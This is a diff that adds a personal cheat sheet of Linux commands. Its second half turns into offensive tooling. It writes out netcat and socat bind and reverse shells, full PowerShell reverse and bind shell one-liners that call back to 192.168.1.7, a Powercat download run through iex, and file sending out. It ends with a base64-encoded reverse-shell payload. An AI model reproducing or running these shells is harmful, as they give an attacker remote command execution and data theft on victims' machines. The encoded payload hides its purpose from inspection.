@@ -1,0 +1,197 @@
+shasum -a 256  kali-lunix.7z
+kali-undercover
+print $PATH
+man command
+command --help
+whatis command 
+apropos tool
+cd 
+ls -a
+rm name
+rm -r name
+mkdir hhh
+cp name name2
+cp -r name name2
+ip a
+ifconfig
+nano name
+cat name
+echo "khj"
+whoami
+su - user
+sudo adduser name
+sudo usermod -aG sudo newuser
+which name tool
+locate name
+updatedb
+find . -name name
+mv name path
+passwd
+sudo service ssh status
+sudo systemctl enable ssh
+sudo systemctl start ssh
+sudo whoami
+sudo apt update
+sudo apt upgrade
+apt-cache search apache2
+apt show apache2
+sudo apt install apache2
+sudo apt remove apache2
+apt remove --purge apache2
+dpkg -i name
+https://overthewire.org/wargames/bandit/bandit0.html
+env
+export PATH=/kali/home:$PATH
+unset PATH
+/bin/ls
+history
+!num
+!!
+ctrl+r
+ls;ls
+ls&&ls
+echo 'hi' > file.txt
+echo 'hi' >> file.txt
+cat < $A
+ls -l
+ls -l khgj
+ls -l khgj > nn 2> nn2
+wc name
+cat file | wc
+cat file.txt | tee new
+ls | xargs rm -r
+grep pass s.txt
+cat s.txt | grep "pass"
+cat s.txt | grep -i "pass"
+cat s.txt | grep -v "pass"
+cat s.txt | grep -v "pass\|password"
+cat s.txt | grep -v [0-9]
+cat s.txt | grep ^pass
+regax
+cat s.txt | grep ^pass.......s
+cat s.txt | grep ^[a-f]
+sed 's/passsword/admin/' s.txt
+sed 's/passsword/admin/' s.txt > file
+sed 's/passsword/admin/g' s.txt 
+split -l 100 file new_
+head file.txt
+tail f.txt
+head -n 20 ro.txt
+cat nn | cut -d ":" -f 1,2
+cat bb | awk '{print $1}'
+awk '/password/{print}' 
+awk '/[0-9]/{print}' 
+sort | uniq -c | sort -n
+comm f1 f2
+comm -12 f1 f2
+sudo tail -f file.txt
+free
+watch free
+watch -n 0.5 -d   free
+df
+wget url
+wget url -O new
+curl file -o new
+axel link -n 20 -a -o
+git clone link
+export HISTIGNORE="&:ls:cd"
+alias l='ls -lah'
+nc -l -p 4444
+nc ip port
+nc -v -l -p 4444
+nc -v ip port
+nc -v -n -l  -p 4444
+nc -v -n ip port
+nc -nlvp 4444
+nc -nv ip 4444
+nc -nlvp 4444 < s.txt
+nc -nv ip 4444 > r.txt
+file name
+nc -nv ip 5555
+nc -nlvp 5555 -e /bin/bash [cmd.exe for win]
+nc -nv ip 5555 -e shell.exe
+nc -nlvp 5555
+nc -nlvp 9000
+nc -nv ip 9000 -e cmd.exe
+socat -TCP4:IP:4444
+socat TCP4-LISTEN:4444 stdout
+cat - sectert.txt
+nc -u
+socat TCP4-LISTEN:4444 stdout ,fork file:file.txt
+socat -TCP4:IP:4444 file:test,create
+rm *.txt
+socat TCP4-LISTEN:4444 , fork exec:/bin/bash
+socat -d -d - TCP4:IP:4444
+socat -d -d TCP4-LISTEN:4444 , fork exec:/bin/bash [you can change -d to -v]
+nc -nlvp 4444 > cert.pem
+nc -nv ip < bind_shell.pem
+socat -d -d OPENSSL-LISTEN:4444,cert=cert.pem , verify=0 , fork exec:/bin/bash
+socat -d -d - OPENSSL:IP:4444,verify=0
+sleep 9000
+sleep 9000&
+ps aux
+jobs
+fg
+ctrl+Z
+bg 
+bg %id
+fg %id
+nohub command
+nohub command&
+disown 
+kill -1 
+kill -2 i
+kill -9 id
+kill -15 id
+killall sleep
+Killall -9 sleep
+pkill slee
+ctrl + shift
+Get-ExecutionPolicy
+Set-ExecutionPolicy unrestricted
+python -m SimpleHTTPServer 8888
+python -c "code"
+powershell -c "(New-Object System.Net.WebClient).DownloadFile("https://example.com/file.zip", "C:\path\to\save\file.zip")
+"
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+Get-ChildItem
+Get-Alias
+---------------------------------------------------------------------------------
+PowerShell File Transfers:
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.1.7:8888/out.zip','C:\Users\limbo\Desktop\out.zip')"
+---------------------------------------------------------------------------------
+PowerShell Bind Shells:
+
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+---------------------------------------------------------------------------------
+PowerShell Reverse Shells:
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+---------------------------------------------------------------------------------
+Powercat
+
+#########
+Download Powercat:
+
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+---------------------------------------------------------------------------------
+Powercat File Transfers:
+
+powercat -c 192.168.1.7 -p 8000 -i C:\Users\limbo\Desktop\file.txt
+---------------------------------------------------------------------------------
+Powercat Bind Shells:
+
+powercat -l -p 4444 -e cmd.exe
+---------------------------------------------------------------------------------
+Powercat Reverse Shells:
+
+powercat -c 192.168.1.7 -p 4444 -e cmd.exe
+---------------------------------------------------------------------------------
+Powercat Stand-Alone Payloads:
+
+powercat -c 192.168.1.7 -p 4444 -e cmd.exe -g > reverseshell.ps1
+powercat -c 192.168.1.7 -p 4444 -e cmd.exe -ge > encodedreverseshell.ps1
+powershell.exe -E JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+---------------------------------------------------------------------------------
